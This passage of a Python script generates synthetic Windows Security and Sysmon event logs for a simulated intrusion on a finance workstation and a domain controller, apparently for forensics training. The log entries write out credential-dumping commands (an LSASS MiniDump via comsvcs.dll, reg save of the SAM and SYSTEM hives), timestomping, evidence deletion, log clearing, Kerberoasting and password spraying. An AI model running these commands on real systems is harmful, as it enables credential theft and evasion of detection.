      <TimeCreated SystemTime="2026-10-10T10:00:26.000Z" />
      <EventRecordID>5018</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\rundll32.exe</Data>
      <Data Name="CommandLine">rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 684 C:\\Users\\jdoe\\AppData\\Local\\Temp\\lsass.dmp full</Data>
      <Data Name="ParentProcessName">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
    </EventData>
  </Event>

  <!-- 43. Sysmon Event 11: File Create for lsass.dmp at 10:00:27Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" />
      <EventID>11</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:27.000Z" />
      <EventRecordID>5019</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Image">C:\\Windows\\System32\\rundll32.exe</Data>
      <Data Name="TargetFilename">C:\\Users\\jdoe\\AppData\\Local\\Temp\\lsass.dmp</Data>
      <Data Name="CreationUtcTime">2026-10-10 10:00:27.000</Data>
    </EventData>
  </Event>

  <!-- 44. Process Creation: Credential Dumping via reg save SAM (4688) at 10:00:28Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:28.000Z" />
      <EventRecordID>5020</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\reg.exe</Data>
      <Data Name="CommandLine">reg.exe save HKLM\\SAM C:\\Users\\jdoe\\AppData\\Local\\Temp\\sam.save /y</Data>
      <Data Name="ParentProcessName">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
    </EventData>
  </Event>

  <!-- 45. Process Creation: Credential Dumping via reg save SYSTEM (4688) at 10:00:29Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:29.000Z" />
      <EventRecordID>5021</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\reg.exe</Data>
      <Data Name="CommandLine">reg.exe save HKLM\\SYSTEM C:\\Users\\jdoe\\AppData\\Local\\Temp\\system.save /y</Data>
      <Data Name="ParentProcessName">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
    </EventData>
  </Event>

  <!-- 46. Event 4648: Logon with Explicit Credentials (Targeting DC-PROD-01) at 10:00:36Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4648</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:36.000Z" />
      <EventRecordID>5022</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="SubjectDomainName">TARGET</Data>
      <Data Name="TargetUserName">svc_admin</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="TargetServerName">DC-PROD-01.target.local</Data>
      <Data Name="ProcessName">C:\\Windows\\System32\\cmd.exe</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
    </EventData>
  </Event>

  <!-- 47. Process Creation (4688): 7-Zip Staging of Financial Records at 10:00:58Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:58.000Z" />
      <EventRecordID>5023</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\\Program Files\\7-Zip\\7z.exe</Data>
      <Data Name="CommandLine">"C:\\Program Files\\7-Zip\\7z.exe" a -tzip "C:\\Users\\jdoe\\AppData\\Local\\Temp\\financial_q3_confidential.zip" "C:\\Users\\jdoe\\Documents\\Finance\\*.csv" "C:\\Users\\jdoe\\AppData\\Local\\Temp\\domain_credentials_dump.txt"</Data>
      <Data Name="ParentProcessName">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
    </EventData>
  </Event>

  <!-- 48. Sysmon Event 11: File Create for financial_q3_confidential.zip at 10:01:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" />
      <EventID>11</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:00.000Z" />
      <EventRecordID>5024</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Image">C:\\Program Files\\7-Zip\\7z.exe</Data>
      <Data Name="TargetFilename">C:\\Users\\jdoe\\AppData\\Local\\Temp\\financial_q3_confidential.zip</Data>
      <Data Name="CreationUtcTime">2026-10-10 10:01:00.000</Data>
      <Data Name="Hashes">MD5={ZIP_MD5},SHA256={ZIP_SHA256}</Data>
    </EventData>
  </Event>

  <!-- 49. Sysmon Event 2: File Creation Time Changed (Timestomping) at 10:01:01Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" />
      <EventID>2</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:01.000Z" />
      <EventRecordID>5025</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Image">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
      <Data Name="TargetFilename">C:\\Users\\jdoe\\AppData\\Local\\Temp\\financial_q3_confidential.zip</Data>
      <Data Name="CreationUtcTime">2024-05-15 08:12:00.000</Data>
      <Data Name="PreviousCreationUtcTime">2026-10-10 10:01:00.000</Data>
    </EventData>
  </Event>

  <!-- 50. Process Creation: Evidence Cleanup via del (4688) at 10:01:10Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:10.000Z" />
      <EventRecordID>5026</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\cmd.exe</Data>
      <Data Name="CommandLine">cmd.exe /c del /f /q C:\\Users\\jdoe\\AppData\\Local\\Temp\\lsass.dmp sam.save system.save</Data>
      <Data Name="ParentProcessName">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
    </EventData>
  </Event>

  <!-- 51. Anti-Forensics: System Event Log Cleared (104) at 10:01:15Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Eventlog" />
      <EventID>104</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:15.000Z" />
      <EventRecordID>5027</EventRecordID>
      <Channel>System</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <UserData>
      <LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">
        <SubjectUserName>jdoe</SubjectUserName>
        <SubjectDomainName>TARGET</SubjectDomainName>
        <Channel>System</Channel>
      </LogFileCleared>
    </UserData>
  </Event>

  <!-- 52. Process Terminated: beacon_updater.exe (4689) at 10:01:25Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4689</EventID>
      <TimeCreated SystemTime="2026-10-10T10:01:25.000Z" />
      <EventRecordID>5028</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="ProcessName">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
      <Data Name="Status">0x0</Data>
    </EventData>
  </Event>
</Events>"""

    with open(out_file, "w", encoding="utf-8") as f:
        f.write(xml_content)
    print(f"[+] Successfully wrote Host A EVTX: {out_file}")

# -------------------------------------------------------------------------
# 5. Build Windows Event Log File: Security_DC-PROD-01.evtx (Host B)
# -------------------------------------------------------------------------
def build_host_b_evtx():
    out_file = os.path.join(OUT_DIR, "05_endpoint_domain_controller_hostB.evtx")

    xml_content = f"""<Events>
  <!-- ===================================================================== -->
  <!-- SECTION A: Domain Controller Background Services, Replication & Logons -->
  <!-- ===================================================================== -->

  <!-- 1. System Boot: Event Log Service Started (6005) at 09:20:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="EventLog" />
      <EventID>6005</EventID>
      <TimeCreated SystemTime="2026-10-10T09:20:00.000Z" />
      <EventRecordID>7901</EventRecordID>
      <Channel>System</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Binary">00000000</Data>
    </EventData>
  </Event>

  <!-- 2. System Boot: Windows Server 2022 Datacenter (6009) at 09:20:02Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="EventLog" />
      <EventID>6009</EventID>
      <TimeCreated SystemTime="2026-10-10T09:20:02.000Z" />
      <EventRecordID>7902</EventRecordID>
      <Channel>System</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="MajorVersion">10</Data>
      <Data Name="MinorVersion">0</Data>
      <Data Name="BuildNumber">20348</Data>
      <Data Name="ServicePack">Server Datacenter</Data>
    </EventData>
  </Event>

  <!-- 3. Service Control Manager: Active Directory Domain Services running (7036) at 09:20:05Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Service Control Manager" />
      <EventID>7036</EventID>
      <TimeCreated SystemTime="2026-10-10T09:20:05.000Z" />
      <EventRecordID>7903</EventRecordID>
      <Channel>System</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="param1">Active Directory Domain Services</Data>
      <Data Name="param2">running</Data>
    </EventData>
  </Event>

  <!-- 4. Service Control Manager: Kerberos Key Distribution Center running (7036) at 09:20:06Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Service Control Manager" />
      <EventID>7036</EventID>
      <TimeCreated SystemTime="2026-10-10T09:20:06.000Z" />
      <EventRecordID>7904</EventRecordID>
      <Channel>System</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="param1">Kerberos Key Distribution Center</Data>
      <Data Name="param2">running</Data>
    </EventData>
  </Event>

  <!-- 5. Service Control Manager: DNS Server running (7036) at 09:20:07Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Service Control Manager" />
      <EventID>7036</EventID>
      <TimeCreated SystemTime="2026-10-10T09:20:07.000Z" />
      <EventRecordID>7905</EventRecordID>
      <Channel>System</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="param1">DNS Server</Data>
      <Data Name="param2">running</Data>
    </EventData>
  </Event>

  <!-- 6. Service Control Manager: Netlogon running (7036) at 09:20:08Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Service Control Manager" />
      <EventID>7036</EventID>
      <TimeCreated SystemTime="2026-10-10T09:20:08.000Z" />
      <EventRecordID>7906</EventRecordID>
      <Channel>System</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="param1">Netlogon</Data>
      <Data Name="param2">running</Data>
    </EventData>
  </Event>

  <!-- 7. Service Control Manager: DFS Replication running (7036) at 09:20:09Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Service Control Manager" />
      <EventID>7036</EventID>
      <TimeCreated SystemTime="2026-10-10T09:20:09.000Z" />
      <EventRecordID>7907</EventRecordID>
      <Channel>System</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="param1">DFS Replication</Data>
      <Data Name="param2">running</Data>
    </EventData>
  </Event>

  <!-- 8. Active Directory Replica Sync Begun (4932) at 09:25:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4932</EventID>
      <TimeCreated SystemTime="2026-10-10T09:25:00.000Z" />
      <EventRecordID>7908</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="DestinationNamingContext">DC=target,DC=local</Data>
      <Data Name="SourceDsaAddress">DC-DR-02.target.local</Data>
    </EventData>
  </Event>

  <!-- 9. Active Directory Replica Sync Ended (4933) at 09:25:05Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4933</EventID>
      <TimeCreated SystemTime="2026-10-10T09:25:05.000Z" />
      <EventRecordID>7909</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="DestinationNamingContext">DC=target,DC=local</Data>
      <Data Name="SourceDsaAddress">DC-DR-02.target.local</Data>
      <Data Name="StatusCode">0</Data>
    </EventData>
  </Event>

  <!-- 10. Service Logon for SYSTEM (4624) at 09:28:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4624</EventID>
      <TimeCreated SystemTime="2026-10-10T09:28:00.000Z" />
      <EventRecordID>7910</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">SYSTEM</Data>
      <Data Name="TargetDomainName">NT AUTHORITY</Data>
      <Data Name="LogonType">5</Data>
      <Data Name="WorkstationName">DC-PROD-01</Data>
      <Data Name="IpAddress">127.0.0.1</Data>
    </EventData>
  </Event>

  <!-- 11. Normal Admin Morning Logon: target_admin (4624) at 09:30:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4624</EventID>
      <TimeCreated SystemTime="2026-10-10T09:30:00.000Z" />
      <EventRecordID>7911</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">target_admin</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="LogonType">2</Data>
      <Data Name="WorkstationName">DC-PROD-01</Data>
      <Data Name="IpAddress">127.0.0.1</Data>
      <Data Name="ProcessName">C:\\Windows\\System32\\winlogon.exe</Data>
    </EventData>
  </Event>

  <!-- 12. Special Privileges Assigned to target_admin (4672) at 09:30:05Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4672</EventID>
      <TimeCreated SystemTime="2026-10-10T09:30:05.000Z" />
      <EventRecordID>7912</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">target_admin</Data>
      <Data Name="SubjectDomainName">TARGET</Data>
      <Data Name="PrivilegeList">SeSecurityPrivilege SeBackupPrivilege SeRestorePrivilege</Data>
    </EventData>
  </Event>

  <!-- 13. Process Creation: Active Directory Users and Computers (4688) at 09:32:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T09:32:00.000Z" />
      <EventRecordID>7913</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">target_admin</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\mmc.exe</Data>
      <Data Name="CommandLine">"C:\\Windows\\System32\\mmc.exe" "C:\\Windows\\System32\\dsa.msc"</Data>
      <Data Name="ParentProcessName">C:\\Windows\\explorer.exe</Data>
    </EventData>
  </Event>

  <!-- 14. Account Logoff for target_admin (4634) at 09:34:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4634</EventID>
      <TimeCreated SystemTime="2026-10-10T09:34:00.000Z" />
      <EventRecordID>7914</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">target_admin</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="LogonType">2</Data>
    </EventData>
  </Event>

  <!-- 15. Kerberos TGT Request for WKSTN-FIN-01$ (4768) at 09:35:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4768</EventID>
      <TimeCreated SystemTime="2026-10-10T09:35:00.000Z" />
      <EventRecordID>7915</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">WKSTN-FIN-01$</Data>
      <Data Name="TargetDomainName">TARGET.LOCAL</Data>
      <Data Name="ServiceName">krbtgt</Data>
      <Data Name="TicketEncryptionType">0x12</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
    </EventData>
  </Event>

  <!-- 16. Kerberos Service Ticket for HOST/dc-prod-01 (4769) at 09:35:02Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4769</EventID>
      <TimeCreated SystemTime="2026-10-10T09:35:02.000Z" />
      <EventRecordID>7916</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">WKSTN-FIN-01$@TARGET.LOCAL</Data>
      <Data Name="ServiceName">HOST/dc-prod-01.target.local</Data>
      <Data Name="TicketEncryptionType">0x12</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
    </EventData>
  </Event>

  <!-- 17. Kerberos TGT Request for WKSTN-ENG-03$ (4768) at 09:36:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4768</EventID>
      <TimeCreated SystemTime="2026-10-10T09:36:00.000Z" />
      <EventRecordID>7917</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">WKSTN-ENG-03$</Data>
      <Data Name="TargetDomainName">TARGET.LOCAL</Data>
      <Data Name="ServiceName">krbtgt</Data>
      <Data Name="TicketEncryptionType">0x12</Data>
      <Data Name="IpAddress">10.0.4.22</Data>
    </EventData>
  </Event>

  <!-- 18. Kerberos TGT Request for WKSTN-HR-02$ (4768) at 09:37:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4768</EventID>
      <TimeCreated SystemTime="2026-10-10T09:37:00.000Z" />
      <EventRecordID>7918</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">WKSTN-HR-02$</Data>
      <Data Name="TargetDomainName">TARGET.LOCAL</Data>
      <Data Name="ServiceName">krbtgt</Data>
      <Data Name="TicketEncryptionType">0x12</Data>
      <Data Name="IpAddress">10.0.4.31</Data>
    </EventData>
  </Event>

  <!-- 19. Service Control Manager: Software Protection service stopped (7036) at 09:40:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Service Control Manager" />
      <EventID>7036</EventID>
      <TimeCreated SystemTime="2026-10-10T09:40:00.000Z" />
      <EventRecordID>7919</EventRecordID>
      <Channel>System</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="param1">Software Protection</Data>
      <Data Name="param2">stopped</Data>
    </EventData>
  </Event>

  <!-- ===================================================================== -->
  <!-- SECTION B: Kerberoasting, Spraying, Compromise, Persistence & Ransom  -->
  <!-- ===================================================================== -->

  <!-- 20. Kerberoasting: Kerberos Service Ticket Request with weak RC4 (4769) at 10:00:26Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4769</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:26.000Z" />
      <EventRecordID>8001</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">jdoe@TARGET.LOCAL</Data>
      <Data Name="ServiceName">MSSQLSvc/dc-prod-01.target.local:1433</Data>
      <Data Name="TicketOptions">0x40810000</Data>
      <Data Name="TicketEncryptionType">0x17</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
      <Data Name="IpPort">49822</Data>
      <Data Name="Status">0x0</Data>
    </EventData>
  </Event>

  <!-- 21. Password Spray Failed Logon: backup_admin (4625) at 10:00:30Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{{54849625-5478-4994-A5BA-3E3B0328C30D}}" />
      <EventID>4625</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:30.000Z" />
      <EventRecordID>8002</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">backup_admin</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="LogonType">3</Data>
      <Data Name="WorkstationName">WKSTN-FIN-01</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
      <Data Name="Status">0xC000006D</Data>
      <Data Name="SubStatus">0xC000006A</Data>
    </EventData>
  </Event>

  <!-- 22. Password Spray Failed Logon: sql_svc (4625) at 10:00:31Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4625</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:31.000Z" />
      <EventRecordID>8003</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">sql_svc</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="LogonType">3</Data>
      <Data Name="WorkstationName">WKSTN-FIN-01</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
      <Data Name="Status">0xC000006D</Data>
      <Data Name="SubStatus">0xC000006A</Data>
    </EventData>
  </Event>

  <!-- 23. Password Spray Failed Logon: adm_john (4625) at 10:00:32Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4625</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:32.000Z" />
      <EventRecordID>8004</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">adm_john</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="LogonType">3</Data>
      <Data Name="WorkstationName">WKSTN-FIN-01</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
      <Data Name="Status">0xC000006D</Data>
      <Data Name="SubStatus">0xC000006A</Data>
    </EventData>
  </Event>

  <!-- 24. Password Spray Failed Logon: backup_admin retry 2 (4625) at 10:00:33Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4625</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:33.000Z" />
      <EventRecordID>8005</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">backup_admin</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="LogonType">3</Data>
      <Data Name="WorkstationName">WKSTN-FIN-01</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
      <Data Name="Status">0xC000006D</Data>
      <Data Name="SubStatus">0xC000006A</Data>
    </EventData>
  </Event>

  <!-- 25. Password Spray Failed Logon: backup_admin retry 3 (4625) at 10:00:34Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4625</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:34.000Z" />
      <EventRecordID>8006</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">backup_admin</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="LogonType">3</Data>
      <Data Name="WorkstationName">WKSTN-FIN-01</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
      <Data Name="Status">0xC000006D</Data>
      <Data Name="SubStatus">0xC000006A</Data>
    </EventData>
  </Event>

  <!-- 26. User Account Locked Out: backup_admin (4740) at 10:00:34.5Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4740</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:34.500Z" />
      <EventRecordID>8007</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">backup_admin</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="SubjectUserName">DC-PROD-01$</Data>
      <Data Name="SubjectDomainName">TARGET</Data>
      <Data Name="WorkstationName">WKSTN-FIN-01</Data>
    </EventData>
  </Event>

  <!-- 27. NTLM Authentication Attempt Validated: svc_admin (4776) at 10:00:37Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4776</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:37.000Z" />
      <EventRecordID>8008</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data>
      <Data Name="TargetUserName">svc_admin</Data>
      <Data Name="Workstation">WKSTN-FIN-01</Data>
      <Data Name="Status">0x0</Data>
    </EventData>
  </Event>

  <!-- 28. Successful Network Logon with Stolen Credentials svc_admin (4624) at 10:00:38Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4624</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:38.000Z" />
      <EventRecordID>8009</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">svc_admin</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="LogonType">3</Data>
      <Data Name="WorkstationName">WKSTN-FIN-01</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
      <Data Name="LogonProcessName">NtLmSsp</Data>
    </EventData>
  </Event>

  <!-- 29. Sensitive Privilege Assignment SeDebugPrivilege (4672) at 10:00:39Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4672</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:39.000Z" />
      <EventRecordID>8010</EventRecordID>
      <Channel>Security</Channel>
      <Computer>DC-PROD-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">svc_admin</Data>
      <Data Name="SubjectDomainName">TARGET</Data>
      <Data Name="PrivilegeList">SeSecurityPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeDebugPrivilege</Data>
    </EventData>
  </Event>

  <!-- 30. Special Group Assigned to Logon: Domain Admins (4964) at 10:00:39.5Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
